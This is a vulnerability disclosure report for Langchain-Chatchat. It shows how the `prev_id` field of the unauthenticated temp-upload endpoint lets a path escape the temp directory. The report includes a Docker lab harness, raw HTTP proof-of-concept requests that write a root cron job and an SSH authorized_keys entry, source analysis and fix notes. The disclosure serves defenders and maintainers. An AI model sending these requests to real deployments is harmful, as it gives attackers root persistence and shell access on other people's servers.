### Vulnerability details

**Official website / Product:** https://github.com/chatchat-space/Langchain-Chatchat

**Repository:** chatchat-space/Langchain-Chatchat (stars at selection: 38714)

**Vulnerability type:** file_upload / RCE (arbitrary file write → cron / authorized_keys getshell)

**Vulnerability versions:** <= 0.3.1.3 (audited commit 49165d6af4438aa7e8a1f71ce276db55f4405151; pyproject version 0.3.1.3; same line unfixed in current master)

**Vulnerability URL / Parameter:** `POST /knowledge_base/upload_temp_docs` form field `prev_id` (with relative path segments in `files` filename)

**Complex:** yes

### Verification procedure

1. Official `chatimage/chatchat` images are ~1.9GB and need GPU/xinference; this minimal harness isolates the product write sinks, matching audited commit `49165d6` `get_temp_dir` + `upload_temp_docs`. Recreate the lab in any working directory:

```bash
mkdir -p /tmp/chatchat-r70-a3-lab && cd /tmp/chatchat-r70-a3-lab
```

`app.py` (sink harness; write occurs before vectorization):

```python
"""
Lab harness isolating Langchain-Chatchat upload_temp_docs / get_temp_dir sinks.
Audited commit: 49165d6af4438aa7e8a1f71ce276db55f4405151 (master)

Exact product logic (path:line):
- libs/chatchat-server/chatchat/server/utils.py:917-932 get_temp_dir
- libs/chatchat-server/chatchat/server/chat/file_chat.py:46-58 parse_file write
- libs/chatchat-server/chatchat/server/chat/file_chat.py:76-110 upload_temp_docs

Full product stack needs GPU/xinference/embeddings; file write occurs BEFORE
KnowledgeFile.file2text / FAISS and persists even when those steps fail.
"""
import os
import uuid
from typing import List, Optional, Tuple

from fastapi import FastAPI, File, Form, UploadFile

BASE_TEMP_DIR = os.environ.get("BASE_TEMP_DIR", "/root/chatchat_data/data/temp")
os.makedirs(BASE_TEMP_DIR, exist_ok=True)

app = FastAPI(title="chatchat-r70-a3-lab")


# --- utils.py:917-932 (Settings.basic_settings.BASE_TEMP_DIR -> BASE_TEMP_DIR) ---
def get_temp_dir(id: str = None) -> Tuple[str, str]:
    """
    创建一个临时目录，返回（路径，文件夹名称）
    """
    if id is not None:  # 如果指定的临时目录已存在，直接返回
        path = os.path.join(BASE_TEMP_DIR, id)
        if os.path.isdir(path):
            return path, id

    id = uuid.uuid4().hex
    path = os.path.join(BASE_TEMP_DIR, id)
    os.mkdir(path)
    return path, id


# --- file_chat.py:46-58 write portion (vectorization omitted; write is pre-vectorization) ---
def parse_file_write(file: UploadFile, dir: str):
    filename = file.filename
    file_path = os.path.join(dir, filename)
    file_content = file.file.read()  # 读取上传文件的内容

    if not os.path.isdir(os.path.dirname(file_path)):
        os.makedirs(os.path.dirname(file_path))
    with open(file_path, "wb") as f:
        f.write(file_content)
    # product then calls KnowledgeFile.file2text; write already durable here
    return True, filename, f"成功上传文件 {filename}"


# --- file_chat.py:76-110 (memo_faiss_pool / vectorization stubbed) ---
@app.post("/knowledge_base/upload_temp_docs")
async def upload_temp_docs(
    files: List[UploadFile] = File(..., description="上传文件，支持多文件"),
    prev_id: Optional[str] = Form(None, description="前知识库ID"),
    chunk_size: int = Form(750),
    chunk_overlap: int = Form(150),
    zh_title_enhance: bool = Form(False),
):
    # product: if prev_id is not None: memo_faiss_pool.pop(prev_id)
    failed_files = []
    path, id = get_temp_dir(prev_id)
    for file in files:
        try:
            ok, name, msg = parse_file_write(file, path)
            if not ok:
                failed_files.append({name: msg})
        except Exception as e:
            failed_files.append({file.filename: f"{file.filename} 文件上传失败，报错信息为: {e}"})
    # product returns BaseResponse(data={"id": id, "failed_files": failed_files})
    return {"code": 200, "msg": "success", "data": {"id": id, "failed_files": failed_files}}


@app.get("/health")
def health():
    return {"ok": True, "BASE_TEMP_DIR": BASE_TEMP_DIR, "commit": "49165d6"}
```

`Dockerfile`:

```dockerfile
FROM python:3.11-slim
WORKDIR /app
RUN pip install --no-cache-dir fastapi==0.109.2 uvicorn==0.27.1 python-multipart==0.0.9
COPY app.py /app/app.py
ENV BASE_TEMP_DIR=/root/chatchat_data/data/temp \
    KB_ROOT_PATH=/root/chatchat_data/data/knowledge_base
RUN mkdir -p /root/chatchat_data/data/temp /root/chatchat_data/data/knowledge_base
EXPOSE 7861
CMD ["uvicorn", "app:app", "--host", "0.0.0.0", "--port", "7861"]
```

`docker-compose.yml`:

```yaml
services:
  chatchat:
    image: chatchat-r70-a3:lab
    container_name: chatchat-r70-a3
    ports:
      - "25003:7861"
```

Build and start:

```bash
cd /tmp/chatchat-r70-a3-lab
docker build -t chatchat-r70-a3:lab .
docker compose up -d
```

Container `chatchat-r70-a3`, image `chatchat-r70-a3:lab`, host port **25003** → container `7861`; `BASE_TEMP_DIR=/root/chatchat_data/data/temp`. The API is unauthenticated by default — no credentials.

2. Optional health check: `curl -s http://127.0.0.1:25003/health` should return JSON with `"ok":true` (e.g. `{"ok":true,"BASE_TEMP_DIR":"/root/chatchat_data/data/temp","commit":"49165d6"}`).
3. Send the full HTTP PoC below: `prev_id=/etc`, upload filename `cron.d/r70a3pwn` with a cron payload.
4. Observe HTTP 200 with `data.id` equal to `/etc` and empty `failed_files`.
5. `docker exec chatchat-r70-a3 cat /etc/cron.d/r70a3pwn` shows the written cron unit; the same pattern with `prev_id=/root` + `filename=.ssh/authorized_keys` writes `/root/.ssh/authorized_keys` (see second request below).

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /knowledge_base/upload_temp_docs HTTP/1.1
Host: 127.0.0.1:25003
User-Agent: r70-a3-poc/1.0
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr70a3prev01
Content-Length: 326

------WebKitFormBoundaryr70a3prev01
Content-Disposition: form-data; name="prev_id"

/etc
------WebKitFormBoundaryr70a3prev01
Content-Disposition: form-data; name="files"; filename="cron.d/r70a3pwn"
Content-Type: application/octet-stream

* * * * * root id > /tmp/r70a3_cron_id

------WebKitFormBoundaryr70a3prev01--
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
date: Mon, 02 Nov 2026 19:01:14 GMT
server: uvicorn
content-length: 67
content-type: application/json
Connection: close

{"code":200,"msg":"success","data":{"id":"/etc","failed_files":[]}}
```

Second request (authorized_keys persistence / getshell chain; adjust Content-Length to the body):

```http
POST /knowledge_base/upload_temp_docs HTTP/1.1
Host: 127.0.0.1:25003
User-Agent: r70-a3-poc/1.0
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr70a3prev02

------WebKitFormBoundaryr70a3prev02
Content-Disposition: form-data; name="prev_id"

/root
------WebKitFormBoundaryr70a3prev02
Content-Disposition: form-data; name="files"; filename=".ssh/authorized_keys"
Content-Type: application/octet-stream

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIR70A3MARKER r70a3@lab

------WebKitFormBoundaryr70a3prev02--
```

Verification result notes:

- `prev_id=/etc` makes `get_temp_dir` discard the configured temp root via `os.path.join(BASE_TEMP_DIR, "/etc")` and return the existing absolute directory `/etc`.
- `os.path.join("/etc", "cron.d/r70a3pwn")` then writes `/etc/cron.d/r70a3pwn` (`os.makedirs` creates parents).
- The same parameter writes `/root/.ssh/authorized_keys` (`prev_id=/root`, `filename=.ssh/authorized_keys`), yielding unauthenticated getshell / persistence.
- The API is unauthenticated by default (consistent with prior public reports on this project).

On-disk proof inside the container (Docker-verified):

```
=== /etc/cron.d/r70a3pwn ===
* * * * * root id > /tmp/r70a3_cron_id

=== /root/.ssh/authorized_keys ===
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIR70A3MARKER r70a3@lab

-rw-r--r-- 1 root root 39 Nov  2 19:01 /etc/cron.d/r70a3pwn
```

Recheck with:

```bash
docker exec chatchat-r70-a3 cat /etc/cron.d/r70a3pwn
docker exec chatchat-r70-a3 ls -l /etc/cron.d/r70a3pwn
docker exec chatchat-r70-a3 cat /root/.ssh/authorized_keys
```

### Vulnerability analysis

`upload_temp_docs` passes attacker-controlled `prev_id` into `get_temp_dir`, which builds `os.path.join(BASE_TEMP_DIR, id)`. When `id` is absolute (`/etc`, `/tmp`, `/root`), Python’s `os.path.join` discards the prefix; if that directory exists, it is reused as the temp root. `_parse_files_in_thread.parse_file` then joins `filename` under that root and writes the body. The write happens **before** `KnowledgeFile.file2text` / FAISS indexing, so later parse failures do not undo the file write.

This is a **different parameter** from the widely disclosed **filename** path traversals on the same endpoint (CVE-2025-6853 / CVE-2026-51884 / #5352 / #5466 / #5510) and is independently fixable: basename-ing `file.filename` alone does not stop `prev_id` from relocating the temp root.

Trigger / sink source (full path and line numbers):

```python
# File: libs/chatchat-server/chatchat/server/utils.py
# Lines: 917-932
def get_temp_dir(id: str = None) -> Tuple[str, str]:
    """
    创建一个临时目录，返回（路径，文件夹名称）
    """
    import uuid

    from chatchat.settings import Settings

    if id is not None:  # 如果指定的临时目录已存在，直接返回
        path = os.path.join(Settings.basic_settings.BASE_TEMP_DIR, id)
        if os.path.isdir(path):
            return path, id

    id = uuid.uuid4().hex
    path = os.path.join(Settings.basic_settings.BASE_TEMP_DIR, id)
    os.mkdir(path)
    return path, id
```

```python
# File: libs/chatchat-server/chatchat/server/chat/file_chat.py
# Lines: 46-58, 76-110
def parse_file(file: UploadFile) -> dict:
    try:
        filename = file.filename
        file_path = os.path.join(dir, filename)
        file_content = file.file.read()
        if not os.path.isdir(os.path.dirname(file_path)):
            os.makedirs(os.path.dirname(file_path))
        with open(file_path, "wb") as f:
            f.write(file_content)
        # ... KnowledgeFile.file2text runs after the write ...

def upload_temp_docs(
    files: List[UploadFile] = File(...),
    prev_id: str = Form(None, description="前知识库ID"),
    ...
) -> BaseResponse:
    if prev_id is not None:
        memo_faiss_pool.pop(prev_id)
    ...
    path, id = get_temp_dir(prev_id)
    for success, file, msg, docs in _parse_files_in_thread(files=files, dir=path, ...):
        ...
```

### Fix notes

1. Force `prev_id` through `os.path.basename` / reject absolute paths and `..` segments; or allow UUID-only values.
2. After `Path.resolve()`, assert the temp path stays under `BASE_TEMP_DIR` (`is_relative_to`).
3. Also basename + contain `filename` in `parse_file` (already covered by public CVEs; still unfixed upstream).
4. Authenticate `/knowledge_base/*` and drop process privileges so `/etc/cron.d` is not writable.
